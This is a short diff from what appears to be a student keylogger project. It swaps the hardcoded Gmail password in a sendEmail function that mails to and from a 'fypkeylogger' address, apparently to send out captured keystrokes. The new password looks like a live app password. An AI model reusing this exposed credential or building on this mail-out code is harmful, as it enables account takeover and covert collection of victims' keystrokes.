@@ -88,7 +88,7 @@ def sendEmail(message):
     smtp_server = "smtp.gmail.com"
     # Sender's email
     senderEmail = "fypkeylogger@gmail.com"
-    password = "keylog123##"
+    password = "pszbbhnovsviuzqv"
     # Receiver's email
     receiverEmail = "fypkeylogger@gmail.com"
     
